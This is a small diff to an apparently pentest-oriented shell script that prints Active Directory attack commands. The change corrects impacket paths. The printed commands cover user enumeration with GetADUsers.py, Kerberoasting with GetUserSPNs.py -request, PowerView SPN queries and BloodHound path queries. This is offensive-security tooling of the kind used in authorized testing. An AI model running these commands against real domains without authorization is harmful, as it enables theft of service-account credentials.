@@ -1061,7 +1061,7 @@ echo
 echo "   -----------------------------------------------------------------------------------------   "
 echo -e "\e[96m ${bold}    [+] Get All Users: ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
-echo "   python3 /opt/opt/impacket/examples/GetADUsers.py -all -dc-ip $ADIP $ADdomain/$ActiveUsername"
+echo "   python3 /opt/impacket/examples/GetADUsers.py -all -dc-ip $ADIP $ADdomain/$ActiveUsername"
 echo "   -----------------------------------------------------------------------------------------   "
 echo
 echo -e "\e[96m ${bold}    [+] Enumerate SMB Share: ${normal}"
@@ -1079,7 +1079,7 @@ echo "   Pywerview: https://github.com/the-useless-one/pywerview"
 echo
 echo -e "\e[96m ${bold}    [+] Kerberoasting: ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
-echo "   python3 /opt/opt/impacket/examples/GetUserSPNs.py -request -dc-ip $ADIP $ADdomain/$ActiveUsername:'$ActivePass'"
+echo "   python3 /opt/impacket/examples/GetUserSPNs.py -request -dc-ip $ADIP $ADdomain/$ActiveUsername:'$ActivePass'"
 echo "   Powerview: Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName"
 echo "   Bloodhound: MATCH(u:User {hasspn:true}) RETURN u"
 echo "   Bloodhound: MATCH(u:User {hasspn:true}.(c:Computer).p=shortestPath(u)-[*1..]->(c)) RETURN p"
